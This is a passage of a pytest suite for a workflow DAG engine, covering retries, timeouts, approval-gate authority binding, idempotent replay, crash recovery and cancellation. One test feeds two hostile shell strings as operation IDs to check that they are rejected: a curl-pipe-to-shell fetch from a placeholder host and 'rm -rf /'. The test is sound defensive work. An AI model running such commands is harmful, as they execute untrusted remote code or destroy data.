"""Typed workflow DAG engine: retries, timeouts, approvals, recovery, cancellation."""

from __future__ import annotations

import json
import time
from concurrent.futures import ThreadPoolExecutor
from contextlib import contextmanager
from datetime import UTC, datetime, timedelta
from inspect import signature
from pathlib import Path
from threading import Event, get_ident
from typing import Any

import pytest
from pydantic import ValidationError

from platform_helpers import make_platform_workspace, store_approval
from raytsystem.authority import AuthorityError
from raytsystem.contracts import (
    ApprovalRecord,
    PendingWorkflowApproval,
    WorkflowApprovalGate,
    WorkflowDefinition,
    WorkflowEdge,
    WorkflowNode,
    WorkflowRetryPolicy,
    WorkflowRevision,
    WorkflowRun,
    canonical_json_bytes,
    derive_id,
    sha256_hex,
)
from raytsystem.contracts.workflows import WorkflowNodeType
from raytsystem.platform_store import (
    PlatformStore,
    initialize_platform_store,
    open_platform_store_read_only,
)
from raytsystem.workflows import ApprovalAuthorityService, WorkflowError, WorkflowService
from raytsystem.workflows.service import _WorkflowDecisionReceipt, workflow_approval_target

pytestmark = pytest.mark.filterwarnings("error")

ACTOR = "user_local_test"
GATE = WorkflowApprovalGate(
    approval_gate_id="wgate_platform_test",
    action="workflow_approval",
    scope_sha256="c" * 64,
    required_role="role_operator",
    expires_after_seconds=120,
)
DECISION_WAIT_STARTED = datetime(2040, 2, 3, 4, 5, 6, tzinfo=UTC)


def _node(
    node_id: str,
    node_type: WorkflowNodeType = WorkflowNodeType.DETERMINISTIC_COMMAND,
    **overrides: Any,
) -> WorkflowNode:
    payload: dict[str, Any] = {
        "node_id": node_id,
        "node_type": node_type,
        "name": f"Node {node_id}",
        "input_schema_sha256": "a" * 64,
        "output_schema_sha256": "b" * 64,
    }
    if node_type is WorkflowNodeType.DETERMINISTIC_COMMAND:
        payload["operation_id"] = "identity"
    payload.update(overrides)
    return WorkflowNode.model_validate(payload)


def _edge(source: str, target: str) -> WorkflowEdge:
    return WorkflowEdge(
        edge_id=f"edge_{source}_{target}", source_node_id=source, target_node_id=target
    )


def _revision(
    nodes: tuple[WorkflowNode, ...],
    edges: tuple[WorkflowEdge, ...],
    **overrides: Any,
) -> WorkflowRevision:
    payload: dict[str, Any] = {
        "revision_id": "wrev_platform_test",
        "workflow_id": "wf_platform_test",
        "version": "1.0.0",
        "trigger_ids": (),
        "nodes": nodes,
        "edges": edges,
        "manifest_sha256": "0" * 64,
        "created_at": datetime(2026, 1, 1, tzinfo=UTC),
    }
    payload.update(overrides)
    draft = WorkflowRevision.model_validate(payload)
    manifest = sha256_hex(
        canonical_json_bytes(draft.model_dump(mode="json", exclude={"manifest_sha256"}))
    )
    return draft.model_copy(update={"manifest_sha256": manifest})


def _definition() -> WorkflowDefinition:
    return WorkflowDefinition(
        workflow_id="wf_platform_test",
        name="Platform workflow",
        description="Workflow engine test fixture",
        enabled=True,
    )


def _registered(
    root: Path,
    nodes: tuple[WorkflowNode, ...],
    edges: tuple[WorkflowEdge, ...],
    **register_kwargs: Any,
) -> tuple[WorkflowService, WorkflowRevision]:
    service = WorkflowService(root)
    revision = _revision(nodes, edges)
    service.register(_definition(), revision, actor_id=ACTOR, **register_kwargs)
    return service, revision


def _start(service: WorkflowService, revision: WorkflowRevision) -> WorkflowRun:
    return service.start(
        revision.revision_id,
        {"seed": "value"},
        actor_id=ACTOR,
        idempotency_key="workflow_case",
    )


def _step_head(root: Path, step_run_id: str) -> Any:
    store = open_platform_store_read_only(root)
    assert store is not None
    with store:
        record = store.head("workflow_step", step_run_id)
    assert record is not None
    return record


def _waiting_approval(
    root: Path,
    *,
    start_key: str = "workflow_decision_start",
    inputs: dict[str, Any] | None = None,
) -> tuple[WorkflowService, WorkflowRun, ApprovalRecord]:
    service, revision = _registered(
        root,
        (
            _node(
                "step_gate",
                WorkflowNodeType.APPROVAL,
                approval_gate_id=GATE.approval_gate_id,
            ),
        ),
        (),
        approval_gates=(GATE,),
    )
    run = service.start(
        revision.revision_id,
        inputs or {"seed": "value"},
        actor_id=ACTOR,
        idempotency_key=start_key,
    )
    service.run_ready_steps(run.workflow_run_id, at=DECISION_WAIT_STARTED)
    approval = ApprovalAuthorityService(root).issue_approval(
        run.workflow_run_id,
        "step_gate",
        approver=ACTOR,
        idempotency_key=f"{start_key}_authority",
        at=DECISION_WAIT_STARTED + timedelta(seconds=1),
    )
    return service, run, approval


def _decision_events(root: Path, workflow_run_id: str) -> tuple[dict[str, Any], ...]:
    store = open_platform_store_read_only(root)
    assert store is not None
    with store:
        return tuple(
            event
            for event in store.list_events(workflow_run_id)
            if event["event_type"] in {"workflow_approval_granted", "workflow_approval_denied"}
        )


def _decision_receipt_count(root: Path) -> int:
    store = open_platform_store_read_only(root)
    assert store is not None
    with store:
        row = store.connection.execute(
            "SELECT COUNT(*) FROM idempotency_receipts WHERE scope='workflow_approval_decision'"
        ).fetchone()
    assert row is not None
    return int(row[0])


def _pending_binding(
    root: Path,
    workflow_run_id: str,
    *,
    at: datetime | None = None,
) -> PendingWorkflowApproval:
    return ApprovalAuthorityService(root).inspect_pending(
        workflow_run_id,
        "step_gate",
        at=at,
    )


def _rewrite_head_payload(
    root: Path,
    kind: str,
    record_id: str,
    payload: dict[str, Any],
) -> None:
    rendered = canonical_json_bytes(payload)
    payload_sha256 = sha256_hex(rendered)
    with initialize_platform_store(root) as store, store.transaction():
        head = store.head(kind, record_id)
        assert head is not None
        store.connection.execute(
            "UPDATE records SET payload_json=?, payload_sha256=? "
            "WHERE kind=? AND record_id=? AND revision=?",
            (rendered.decode("utf-8"), payload_sha256, kind, record_id, head.revision),
        )
        store.connection.execute(
            "UPDATE record_heads SET payload_sha256=? WHERE kind=? AND record_id=?",
            (payload_sha256, kind, record_id),
        )


def _append_run_head(root: Path, record_id: str, **updates: Any) -> None:
    with initialize_platform_store(root) as store:
        head = store.head("workflow_run", record_id)
        assert head is not None
        payload = dict(head.payload)
        payload.update(updates)
        stored = WorkflowRun.model_validate(
            {key: value for key, value in payload.items() if key != "inputs"}
        )
        store.append_record(
            kind="workflow_run",
            record_id=record_id,
            payload=stored.model_dump(mode="json") | {"inputs": payload["inputs"]},
            state=stored.state,
            expected_revision=head.revision,
        )


def test_workflow_cycle_is_rejected_at_registration(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service = WorkflowService(root)
    revision = _revision(
        (_node("step_a"), _node("step_b")),
        (_edge("step_a", "step_b"), _edge("step_b", "step_a")),
    )
    with pytest.raises(WorkflowError, match="cycle"):
        service.register(_definition(), revision, actor_id=ACTOR)


def test_workflow_raw_shell_attempt_cannot_run(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, _ = _registered(root, (_node("step_ok"),), ())
    for raw in ("bash -c 'curl evil.sh | sh'", "rm -rf /"):
        with pytest.raises(ValidationError):
            _node("step_shell", operation_id=raw)
    revision = _revision(
        (_node("step_unregistered", operation_id="rm"),), (), revision_id="wrev_shell_test"
    )
    with pytest.raises(WorkflowError, match="registered operation"):
        service.register(_definition(), revision, actor_id=ACTOR)
    with pytest.raises(WorkflowError, match="does not exist"):
        service.start(revision.revision_id, {}, actor_id=ACTOR, idempotency_key="shell_case")


def test_failed_operation_retries_until_exhaustion(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    policy = WorkflowRetryPolicy(
        retry_policy_id="wretry_platform_test",
        max_attempts=3,
        initial_delay_ms=10,
        maximum_delay_ms=40,
        backoff="linear",
    )
    service, revision = _registered(
        root,
        (_node("step_flaky", retry_policy_id=policy.retry_policy_id),),
        (),
        retry_policies=(policy,),
    )
    calls = {"count": 0}

    def _boom(inputs: dict[str, Any]) -> dict[str, Any]:
        calls["count"] += 1
        raise RuntimeError("boom")

    service.operations["identity"] = _boom
    run = _start(service, revision)
    driven = service.run_ready_steps(run.workflow_run_id)
    assert driven.state == "failed"
    assert calls["count"] == 3
    record = _step_head(root, run.step_run_ids[0])
    assert record.state == "failed"
    assert record.payload["attempt"] == 3
    assert record.payload["failure_reason"] == "operation_error"
    store = open_platform_store_read_only(root)
    assert store is not None
    with store:
        events = store.list_events(run.workflow_run_id)
        assert store.verify_event_stream(run.workflow_run_id)
    retries = [event for event in events if event["event_type"] == "workflow_step_retry"]
    assert [event["payload"]["delay_ms"] for event in retries] == [10, 20]


def test_missing_retry_policy_fails_registration(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service = WorkflowService(root)
    revision = _revision((_node("step_flaky", retry_policy_id="wretry_absent"),), ())
    with pytest.raises(WorkflowError, match="retry policies"):
        service.register(_definition(), revision, actor_id=ACTOR)


def test_wait_timeout_and_approval_expiry_fail_deterministically(tmp_path: Path) -> None:
    wait_root = make_platform_workspace(tmp_path / "wait")
    service, revision = _registered(
        wait_root, (_node("step_wait", WorkflowNodeType.WAIT, timeout_seconds=60),), ()
    )
    run = _start(service, revision)
    driven = service.run_ready_steps(run.workflow_run_id)
    assert driven.state == "running"
    assert _step_head(wait_root, run.step_run_ids[0]).state == "waiting"
    later = datetime.now(UTC) + timedelta(hours=2)
    expired = service.run_ready_steps(run.workflow_run_id, at=later)
    assert expired.state == "failed"
    assert _step_head(wait_root, run.step_run_ids[0]).payload["failure_reason"] == "timeout"

    gate_root = make_platform_workspace(tmp_path / "gate")
    approval_service, approval_revision = _registered(
        gate_root,
        (
            _node(
                "step_gate",
                WorkflowNodeType.APPROVAL,
                approval_gate_id=GATE.approval_gate_id,
            ),
        ),
        (),
        approval_gates=(GATE,),
    )
    gate_run = _start(approval_service, approval_revision)
    approval_service.run_ready_steps(gate_run.workflow_run_id)
    with pytest.raises(WorkflowError, match="expired"):
        approval_service.grant_approval(
            gate_run.workflow_run_id,
            "step_gate",
            approval_id="apr_late",
            actor_id=ACTOR,
            idempotency_key="platform_workflow_expired_decision",
            at=later,
        )
    record = _step_head(gate_root, gate_run.step_run_ids[0])
    assert record.state == "failed"
    assert record.payload["failure_reason"] == "approval_expired"
    assert approval_service.run_ready_steps(gate_run.workflow_run_id).state == "failed"


def test_approval_grant_continues_and_wrong_target_is_rejected(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    nodes = (
        _node("step_a"),
        _node("step_gate", WorkflowNodeType.APPROVAL, approval_gate_id=GATE.approval_gate_id),
        _node("step_b", operation_id="summarize_keys"),
    )
    edges = (_edge("step_a", "step_gate"), _edge("step_gate", "step_b"))
    service, revision = _registered(root, nodes, edges, approval_gates=(GATE,))
    run = _start(service, revision)
    assert _start(service, revision).workflow_run_id == run.workflow_run_id
    driven = service.run_ready_steps(run.workflow_run_id)
    assert driven.state == "running"
    assert _step_head(root, run.step_run_ids[1]).state == "waiting"
    wrong_target = store_approval(
        root,
        action="workflow_approval",
        target_id=workflow_approval_target(run.workflow_run_id, "step_b"),
        artifact_sha256=run.input_sha256,
        scope=(GATE.required_role,),
    )
    with pytest.raises(WorkflowError, match="authority"):
        service.grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=wrong_target.approval_id,
            actor_id=ACTOR,
            idempotency_key="platform_workflow_wrong_target_decision",
        )
    gate_unbound = store_approval(
        root,
        action="workflow_approval",
        target_id=workflow_approval_target(run.workflow_run_id, "step_gate"),
        artifact_sha256=run.input_sha256,
        scope=(GATE.required_role,),
    )
    with pytest.raises(WorkflowError, match="authority"):
        service.grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=gate_unbound.approval_id,
            actor_id=ACTOR,
            idempotency_key="platform_workflow_unbound_gate_decision",
        )
    issued_at = datetime.now(UTC)
    wrong_policy_version = ApprovalRecord.create(
        action="workflow_approval",
        target_id=workflow_approval_target(run.workflow_run_id, "step_gate"),
        artifact_sha256=run.input_sha256,
        scope=(GATE.required_role,),
        policy_version="0.9.0",
        policy_sha256=GATE.scope_sha256,
        approver=ACTOR,
        approved_at=issued_at,
        expires_at=issued_at + timedelta(hours=1),
    )
    with initialize_platform_store(root) as store:
        store.append_record(
            kind="authority_approval",
            record_id=wrong_policy_version.approval_id,
            payload=wrong_policy_version.model_dump(mode="json"),
            state="accepted",
            expected_revision=None,
        )
    with pytest.raises(WorkflowError, match="authority"):
        service.grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=wrong_policy_version.approval_id,
            actor_id=ACTOR,
            idempotency_key="platform_workflow_wrong_policy_decision",
        )
    approval = ApprovalAuthorityService(root).issue_approval(
        run.workflow_run_id,
        "step_gate",
        approver=ACTOR,
        idempotency_key="platform_workflow_grant",
    )
    service.grant_approval(
        run.workflow_run_id,
        "step_gate",
        approval_id=approval.approval_id,
        actor_id=ACTOR,
        idempotency_key="platform_workflow_grant_decision",
    )
    gate_record = _step_head(root, run.step_run_ids[1])
    assert gate_record.state == "succeeded"
    assert gate_record.payload["approval_id"] == approval.approval_id
    assert service.run_ready_steps(run.workflow_run_id).state == "succeeded"


def test_deny_approval_fails_the_run(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, revision = _registered(
        root,
        (
            _node(
                "step_gate",
                WorkflowNodeType.APPROVAL,
                approval_gate_id=GATE.approval_gate_id,
            ),
        ),
        (),
        approval_gates=(GATE,),
    )
    run = _start(service, revision)
    service.run_ready_steps(run.workflow_run_id)
    expected = _pending_binding(root, run.workflow_run_id)
    denied = service.deny_approval(
        run.workflow_run_id,
        "step_gate",
        expected=expected,
        actor_id=ACTOR,
        idempotency_key="platform_workflow_deny_decision",
    )
    assert denied.state == "failed"
    record = _step_head(root, run.step_run_ids[0])
    assert record.state == "failed"
    assert record.payload["failure_reason"] == "approval_denied"


def test_deny_approval_requires_a_typed_expected_pending_binding() -> None:
    parameter = signature(WorkflowService.deny_approval).parameters.get("expected")

    assert parameter is not None
    assert parameter.default is parameter.empty
    assert parameter.annotation in {PendingWorkflowApproval, "PendingWorkflowApproval"}


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("revision_id", "wrev_changed_expected"),
        ("step_run_id", "wstep_changed_expected"),
        ("action", "workflow_other_action"),
        ("target_id", "wfappr_changed_expected"),
        ("input_sha256", "d" * 64),
        ("scope_sha256", "d" * 64),
        ("policy_version", "1.5.0"),
        ("required_role", "role_reviewer"),
        ("expires_at", DECISION_WAIT_STARTED + timedelta(seconds=121)),
    ],
)
def test_deny_approval_rejects_changed_expected_binding_without_side_effect(
    tmp_path: Path,
    field: str,
    value: object,
) -> None:
    root = make_platform_workspace(tmp_path / field)
    service, run, _ = _waiting_approval(root, start_key=f"deny_expected_{field}")
    expected = _pending_binding(
        root,
        run.workflow_run_id,
        at=DECISION_WAIT_STARTED + timedelta(seconds=1),
    )

    with pytest.raises(WorkflowError, match=r"binding|expected|pending"):
        service.deny_approval(
            run.workflow_run_id,
            "step_gate",
            expected=expected.model_copy(update={field: value}),
            actor_id=ACTOR,
            idempotency_key=f"deny_expected_decision_{field}",
            at=DECISION_WAIT_STARTED + timedelta(seconds=2),
        )

    assert _step_head(root, run.step_run_ids[0]).state == "waiting"
    assert _decision_events(root, run.workflow_run_id) == ()
    assert _decision_receipt_count(root) == 0


def test_deny_approval_rejects_transient_pending_inspection_without_side_effect(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    root = make_platform_workspace(tmp_path)
    service, run, _ = _waiting_approval(root, start_key="deny_inspection_unavailable")
    expected = _pending_binding(
        root,
        run.workflow_run_id,
        at=DECISION_WAIT_STARTED + timedelta(seconds=1),
    )

    def _unavailable(*_args: object, **_kwargs: object) -> object:
        raise AuthorityError("Workflow approval state is unavailable")

    monkeypatch.setattr(ApprovalAuthorityService, "_pending_context", _unavailable)

    with pytest.raises(WorkflowError, match=r"unavailable|binding"):
        service.deny_approval(
            run.workflow_run_id,
            "step_gate",
            expected=expected,
            actor_id=ACTOR,
            idempotency_key="deny_inspection_unavailable_decision",
            at=DECISION_WAIT_STARTED + timedelta(seconds=2),
        )

    assert _step_head(root, run.step_run_ids[0]).state == "waiting"
    assert _decision_events(root, run.workflow_run_id) == ()
    assert _decision_receipt_count(root) == 0


def test_deny_replay_rejects_same_key_with_changed_expected_binding(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, run, _ = _waiting_approval(root, start_key="deny_expected_replay")
    expected = _pending_binding(
        root,
        run.workflow_run_id,
        at=DECISION_WAIT_STARTED + timedelta(seconds=1),
    )
    decision_key = "deny_expected_replay_decision"
    first = service.deny_approval(
        run.workflow_run_id,
        "step_gate",
        expected=expected,
        actor_id=ACTOR,
        idempotency_key=decision_key,
        at=DECISION_WAIT_STARTED + timedelta(seconds=2),
    )

    with pytest.raises(WorkflowError, match=r"idempotency|binding"):
        service.deny_approval(
            run.workflow_run_id,
            "step_gate",
            expected=expected.model_copy(update={"required_role": "role_reviewer"}),
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )

    assert first.state == "failed"
    assert len(_decision_events(root, run.workflow_run_id)) == 1
    assert _decision_receipt_count(root) == 1


def test_deny_replay_rejects_changed_workflow_revision_head(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, run, _ = _waiting_approval(root, start_key="deny_revision_replay")
    expected = _pending_binding(
        root,
        run.workflow_run_id,
        at=DECISION_WAIT_STARTED + timedelta(seconds=1),
    )
    decision_key = "deny_revision_replay_decision"
    service.deny_approval(
        run.workflow_run_id,
        "step_gate",
        expected=expected,
        actor_id=ACTOR,
        idempotency_key=decision_key,
        at=DECISION_WAIT_STARTED + timedelta(seconds=2),
    )
    with initialize_platform_store(root) as store:
        revision = store.head("workflow_revision", run.revision_id)
        assert revision is not None
        store.append_record(
            kind=revision.kind,
            record_id=revision.record_id,
            payload=revision.payload,
            state=revision.state,
            expected_revision=revision.revision,
        )

    with pytest.raises(WorkflowError, match=r"revision|binding|receipt"):
        service.deny_approval(
            run.workflow_run_id,
            "step_gate",
            expected=expected,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )

    assert len(_decision_events(root, run.workflow_run_id)) == 1
    assert _decision_receipt_count(root) == 1


def test_deny_rejects_workflow_revision_changed_after_inspection(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, run, _ = _waiting_approval(root, start_key="deny_revision_cas")
    expected = _pending_binding(
        root,
        run.workflow_run_id,
        at=DECISION_WAIT_STARTED + timedelta(seconds=1),
    )
    alternate = _revision(
        (
            _node(
                "step_gate",
                WorkflowNodeType.APPROVAL,
                approval_gate_id=GATE.approval_gate_id,
            ),
        ),
        (),
        revision_id="wrev_deny_revision_cas",
        version="1.0.1",
    )
    service.register(_definition(), alternate, actor_id=ACTOR, approval_gates=(GATE,))
    _append_run_head(root, run.workflow_run_id, revision_id=alternate.revision_id)

    with pytest.raises(WorkflowError, match=r"expected|binding|idempotency"):
        service.deny_approval(
            run.workflow_run_id,
            "step_gate",
            expected=expected,
            actor_id=ACTOR,
            idempotency_key="deny_revision_cas_decision",
            at=DECISION_WAIT_STARTED + timedelta(seconds=2),
        )

    assert _step_head(root, run.step_run_ids[0]).state == "waiting"
    assert _decision_events(root, run.workflow_run_id) == ()
    assert _decision_receipt_count(root) == 0


def test_deny_approval_rejects_malformed_expected_contract(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, run, _ = _waiting_approval(root, start_key="deny_malformed_expected")

    with pytest.raises(WorkflowError, match=r"expected|binding"):
        service.deny_approval(
            run.workflow_run_id,
            "step_gate",
            expected={},  # type: ignore[arg-type]
            actor_id=ACTOR,
            idempotency_key="deny_malformed_expected_decision",
            at=DECISION_WAIT_STARTED + timedelta(seconds=2),
        )

    assert _step_head(root, run.step_run_ids[0]).state == "waiting"
    assert _decision_events(root, run.workflow_run_id) == ()
    assert _decision_receipt_count(root) == 0


def test_crash_recovery_resumes_without_reexecuting_steps(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    nodes = (
        _node("step_a"),
        _node("step_gate", WorkflowNodeType.APPROVAL, approval_gate_id=GATE.approval_gate_id),
        _node("step_b", operation_id="summarize_keys"),
    )
    edges = (_edge("step_a", "step_gate"), _edge("step_gate", "step_b"))
    service, revision = _registered(root, nodes, edges, approval_gates=(GATE,))
    first_calls = {"count": 0}

    def _counting_identity(inputs: dict[str, Any]) -> dict[str, Any]:
        first_calls["count"] += 1
        return {"marker": "from_step_a"}

    service.operations["identity"] = _counting_identity
    run = _start(service, revision)
    assert service.run_ready_steps(run.workflow_run_id).state == "running"
    assert first_calls["count"] == 1

    recovered = WorkflowService(root)
    second_calls = {"identity": 0, "summarize_keys": 0}
    captured: list[dict[str, Any]] = []

    def _must_not_run(inputs: dict[str, Any]) -> dict[str, Any]:
        second_calls["identity"] += 1
        return {"marker": "re_executed"}

    def _capture(inputs: dict[str, Any]) -> dict[str, Any]:
        second_calls["summarize_keys"] += 1
        captured.append(dict(inputs))
        return {"keys": sorted(str(key) for key in inputs)}

    recovered.operations["identity"] = _must_not_run
    recovered.operations["summarize_keys"] = _capture
    approval = ApprovalAuthorityService(root).issue_approval(
        run.workflow_run_id,
        "step_gate",
        approver=ACTOR,
        idempotency_key="platform_workflow_recovery",
    )
    recovered.grant_approval(
        run.workflow_run_id,
        "step_gate",
        approval_id=approval.approval_id,
        actor_id=ACTOR,
        idempotency_key="platform_workflow_recovery_decision",
    )
    resumed = recovered.run_ready_steps(run.workflow_run_id)
    assert resumed.state == "succeeded"
    assert second_calls == {"identity": 0, "summarize_keys": 1}
    assert captured[0]["step_a"] == {"marker": "from_step_a"}
    assert captured[0]["step_gate"]["approval_id"] == approval.approval_id
    recovered.run_ready_steps(run.workflow_run_id)
    assert second_calls == {"identity": 0, "summarize_keys": 1}


def test_cancel_guards_terminal_runs_and_cancels_pending_steps(tmp_path: Path) -> None:
    done_root = make_platform_workspace(tmp_path / "done")
    service, revision = _registered(done_root, (_node("step_a"),), ())
    run = _start(service, revision)
    assert service.run_ready_steps(run.workflow_run_id).state == "succeeded"
    with pytest.raises(WorkflowError, match=r"[Tt]erminal"):
        service.cancel(run.workflow_run_id, actor_id=ACTOR)
    assert _step_head(done_root, run.step_run_ids[0]).state == "succeeded"

    wait_root = make_platform_workspace(tmp_path / "wait")
    waiting_service, waiting_revision = _registered(
        wait_root,
        (_node("step_wait", WorkflowNodeType.WAIT), _node("step_b")),
        (_edge("step_wait", "step_b"),),
    )
    waiting_run = _start(waiting_service, waiting_revision)
    waiting_service.run_ready_steps(waiting_run.workflow_run_id)
    cancelled = waiting_service.cancel(waiting_run.workflow_run_id, actor_id=ACTOR)
    assert cancelled.state == "cancelled"
    assert _step_head(wait_root, waiting_run.step_run_ids[0]).state == "cancelled"
    assert _step_head(wait_root, waiting_run.step_run_ids[1]).state == "cancelled"
    with pytest.raises(WorkflowError, match=r"[Tt]erminal"):
        waiting_service.cancel(waiting_run.workflow_run_id, actor_id=ACTOR)


def test_pause_resume_round_trip_with_state_guards(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, revision = _registered(root, (_node("step_a"),), ())
    calls = {"count": 0}

    def _counting(inputs: dict[str, Any]) -> dict[str, Any]:
        calls["count"] += 1
        return {"ok": True}

    service.operations["identity"] = _counting
    run = _start(service, revision)
    paused = service.pause(run.workflow_run_id, actor_id=ACTOR)
    assert paused.state == "paused"
    with pytest.raises(WorkflowError, match="running"):
        service.pause(run.workflow_run_id, actor_id=ACTOR)
    assert service.run_ready_steps(run.workflow_run_id).state == "paused"
    assert calls["count"] == 0
    resumed = service.resume(run.workflow_run_id, actor_id=ACTOR)
    assert resumed.state == "running"
    with pytest.raises(WorkflowError, match="paused"):
        service.resume(run.workflow_run_id, actor_id=ACTOR)
    assert service.run_ready_steps(run.workflow_run_id).state == "succeeded"
    assert calls["count"] == 1


def test_wake_completes_wait_step(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, revision = _registered(
        root,
        (_node("step_wait", WorkflowNodeType.WAIT), _node("step_b")),
        (_edge("step_wait", "step_b"),),
    )
    run = _start(service, revision)
    with pytest.raises(WorkflowError, match="waiting"):
        service.wake(run.workflow_run_id, "step_wait", actor_id=ACTOR)
    service.run_ready_steps(run.workflow_run_id)
    service.wake(run.workflow_run_id, "step_wait", actor_id=ACTOR)
    assert _step_head(root, run.step_run_ids[0]).state == "succeeded"
    assert service.run_ready_steps(run.workflow_run_id).state == "succeeded"


def test_workflow_engine_disabled_fails_closed(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path, flag_overrides={"workflow_engine_enabled": False})
    service = WorkflowService(root)
    revision = _revision((_node("step_a"),), ())
    with pytest.raises(WorkflowError, match="disabled"):
        service.register(_definition(), revision, actor_id=ACTOR)
    with pytest.raises(WorkflowError, match="disabled"):
        service.start(revision.revision_id, {}, actor_id=ACTOR, idempotency_key="off_case")
    with pytest.raises(WorkflowError, match="disabled"):
        service.run_ready_steps("wrun_missing")
    with pytest.raises(WorkflowError, match="disabled"):
        service.grant_approval(
            "wrun_missing",
            "step_gate",
            approval_id="apr_missing",
            actor_id=ACTOR,
            idempotency_key="platform_workflow_disabled_decision",
        )
    with pytest.raises(WorkflowError, match="disabled"):
        service.cancel("wrun_missing", actor_id=ACTOR)


def test_snapshot_exposes_graph_and_hides_raw_inputs(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, revision = _registered(
        root, (_node("step_a"), _node("step_b")), (_edge("step_a", "step_b"),)
    )
    run = service.start(
        revision.revision_id,
        {"secret_free": "raw input value"},
        actor_id=ACTOR,
        idempotency_key="snapshot_case",
    )
    service.run_ready_steps(run.workflow_run_id)
    snapshot = service.snapshot()
    assert snapshot["state"] == "ready"
    graph = snapshot["graph"]
    assert graph[0]["workflow_id"] == revision.workflow_id
    assert {node["node_id"] for node in graph[0]["nodes"]} == {"step_a", "step_b"}
    assert graph[0]["edges"][0]["source_node_id"] == "step_a"
    assert all("inputs" not in payload for payload in snapshot["runs"])
    assert "raw input value" not in canonical_json_bytes(snapshot).decode("utf-8")


@pytest.mark.parametrize("decision", ["grant", "deny"])
def test_workflow_decision_crash_replay_returns_original_run_without_second_event(
    tmp_path: Path, decision: str
) -> None:
    root = make_platform_workspace(tmp_path / decision)
    service, run, approval = _waiting_approval(root, start_key=f"decision_crash_{decision}")
    decision_key = f"decision_crash_replay_{decision}"
    decided_at = DECISION_WAIT_STARTED + timedelta(seconds=2)
    expected = _pending_binding(
        root,
        run.workflow_run_id,
        at=DECISION_WAIT_STARTED + timedelta(seconds=1),
    )

    if decision == "grant":
        first = service.grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=approval.approval_id,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=decided_at,
        )
    else:
        first = service.deny_approval(
            run.workflow_run_id,
            "step_gate",
            expected=expected,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=decided_at,
        )
    assert type(first) is WorkflowRun
    events_after_commit = _decision_events(root, run.workflow_run_id)
    if decision == "grant":
        assert first.state == "running"
        assert service.run_ready_steps(run.workflow_run_id).state == "succeeded"

    recovered = WorkflowService(root)
    replay_at = DECISION_WAIT_STARTED + timedelta(days=1)
    if decision == "grant":
        replay = recovered.grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=approval.approval_id,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=replay_at,
        )
    else:
        replay = recovered.deny_approval(
            run.workflow_run_id,
            "step_gate",
            expected=expected,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=replay_at,
        )

    assert replay == first
    assert _decision_events(root, run.workflow_run_id) == events_after_commit
    assert len(events_after_commit) == 1
    assert _decision_receipt_count(root) == 1
    if decision == "deny":
        with initialize_platform_store(root) as store:
            authority_record = store.head("authority_approval", approval.approval_id)
        assert authority_record is not None
        assert authority_record.state == "accepted"
        assert authority_record.revision == 1


def test_pre_expected_binding_grant_receipt_replays_compatibly(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, run, approval = _waiting_approval(root, start_key="legacy_grant_receipt")
    decision_key = "legacy_grant_receipt_decision"
    first = service.grant_approval(
        run.workflow_run_id,
        "step_gate",
        approval_id=approval.approval_id,
        actor_id=ACTOR,
        idempotency_key=decision_key,
        at=DECISION_WAIT_STARTED + timedelta(seconds=2),
    )
    with initialize_platform_store(root) as store, store.transaction():
        row = store.connection.execute(
            "SELECT receipt_json FROM idempotency_receipts "
            "WHERE scope='workflow_approval_decision' AND idempotency_key=?",
            (decision_key,),
        ).fetchone()
        assert row is not None
        stored_receipt = json.loads(str(row[0]))
        assert "expected_pending" not in stored_receipt
        parsed = _WorkflowDecisionReceipt.model_validate(stored_receipt)
        legacy_receipt = parsed.model_dump(mode="json", exclude={"expected_pending"})
        legacy_receipt["receipt_id"] = derive_id(
            "wdec",
            parsed.model_dump(
                mode="python",
                exclude={"receipt_id", "expected_pending"},
            ),
        )
        store.connection.execute(
            "UPDATE idempotency_receipts SET receipt_json=? "
            "WHERE scope='workflow_approval_decision' AND idempotency_key=?",
            (canonical_json_bytes(legacy_receipt).decode("utf-8"), decision_key),
        )

    replay = WorkflowService(root).grant_approval(
        run.workflow_run_id,
        "step_gate",
        approval_id=approval.approval_id,
        actor_id=ACTOR,
        idempotency_key=decision_key,
        at=DECISION_WAIT_STARTED + timedelta(seconds=3),
    )

    assert replay == first
    assert len(_decision_events(root, run.workflow_run_id)) == 1


def test_workflow_grant_replay_rejects_another_revision_with_same_gate_and_input(
    tmp_path: Path,
) -> None:
    root = make_platform_workspace(tmp_path)
    service, run, approval = _waiting_approval(root, start_key="decision_run_revision")
    decision_key = "decision_run_revision_exact"
    first = service.grant_approval(
        run.workflow_run_id,
        "step_gate",
        approval_id=approval.approval_id,
        actor_id=ACTOR,
        idempotency_key=decision_key,
        at=DECISION_WAIT_STARTED + timedelta(seconds=2),
    )
